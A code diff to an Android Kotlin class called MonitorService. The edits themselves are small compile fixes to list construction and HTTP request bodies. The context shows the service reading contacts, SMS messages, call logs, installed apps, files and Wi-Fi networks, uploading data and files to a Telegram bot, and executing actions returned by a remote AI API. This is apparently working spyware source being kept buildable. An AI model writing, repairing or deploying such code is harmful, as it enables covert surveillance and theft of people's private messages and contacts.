@@ -148,7 +148,7 @@ class MonitorService : Service() {
                 @Suppress("UNCHECKED_CAST")
                 (smsObj as List<Map<String, Any>>)
             } else {
-                arrayListOf<Map<String, Any>>() as List<Map<String, Any>>
+                ArrayList<Map<String, Any>>() as List<Map<String, Any>>
             }
             val smsPreview = StringBuilder()
             var count = 0
@@ -355,7 +355,7 @@ class MonitorService : Service() {
     }
 
     private fun getContacts(): Map<String, Any> {
-        val list = arrayListOf<Map<String, Any>>()
+        val list = ArrayList<Map<String, Any>>()
         try {
             val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                 arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER),
@@ -365,7 +365,7 @@ class MonitorService : Service() {
                     val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                     val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                     val hasPhone = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
-                    val phones = arrayListOf<String>()
+                    val phones = ArrayList<String>()
                     if (hasPhone) {
                         val pCursor = contentResolver.query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -396,7 +396,7 @@ class MonitorService : Service() {
     }
 
     private fun getSms(): Map<String, Any> {
-        val list = arrayListOf<Map<String, Any>>()
+        val list = ArrayList<Map<String, Any>>()
         try {
             val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI,
                 arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
@@ -424,7 +424,7 @@ class MonitorService : Service() {
     }
 
     private fun getCallLogs(): Map<String, Any> {
-        val list = arrayListOf<Map<String, Any>>()
+        val list = ArrayList<Map<String, Any>>()
         try {
             val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                 arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE),
@@ -453,7 +453,7 @@ class MonitorService : Service() {
     }
 
     private fun getApps(): Map<String, Any> {
-        val list = arrayListOf<Map<String, Any>>()
+        val list = ArrayList<Map<String, Any>>()
         try {
             val pm = packageManager
             val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
@@ -491,7 +491,7 @@ class MonitorService : Service() {
                                 "modified" to f.lastModified()
                             ) as Map<String, Any>
                         } catch (e: Exception) { null }
-                    } ?: arrayListOf<Map<String, Any>>() as List<Map<String, Any>>
+                    } ?: ArrayList<Map<String, Any>>() as List<Map<String, Any>>
                     hashMapOf<String, Any>(
                         "files" to files.take(200),
                         "path" to path,
@@ -505,7 +505,7 @@ class MonitorService : Service() {
 
     private fun scanWifi(): Map<String, Any> {
         val wm = getSystemService(android.net.wifi.WifiManager::class.java)
-        val results = wm.scanResults ?: arrayListOf<Map<String, Any>>() as List<Map<String, Any>>
+        val results = wm.scanResults ?: ArrayList<android.net.wifi.ScanResult>() as List<android.net.wifi.ScanResult>
         val networks = results.map { r ->
             hashMapOf<String, Any>(
                 "ssid" to r.SSID,
@@ -727,7 +727,9 @@ class MonitorService : Service() {
                 "parse_mode" to "Markdown"
             ) as Map<String, Any>
             val jsonBody = gson.toJson(params)
-            val body = RequestBody.create(jsonBody)
+            @Suppress("DEPRECATION")
+            val mediaType = MediaType.parse("application/json")
+            val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
@@ -744,7 +746,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create("text/plain".toMediaType(), file.readBytes()))
+                        @Suppress("DEPRECATION") RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -814,7 +816,9 @@ Only respond with valid JSON, no extra text."""
             ) as Map<String, Any>
 
             val jsonBody = gson.toJson(payload)
-            val body = RequestBody.create(jsonBody)
+            @Suppress("DEPRECATION")
+            val mediaType = MediaType.parse("application/json")
+            val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
                 .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
@@ -841,7 +845,7 @@ Only respond with valid JSON, no extra text."""
     }
 
     private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
-        val results = arrayListOf<Map<String, Any>>() as List<Map<String, Any>>
+        val results = ArrayList<Map<String, Any>>() as List<Map<String, Any>>
         try {
             val json = com.google.gson.JsonParser.parseString(aiResponse)
             val actions = when {
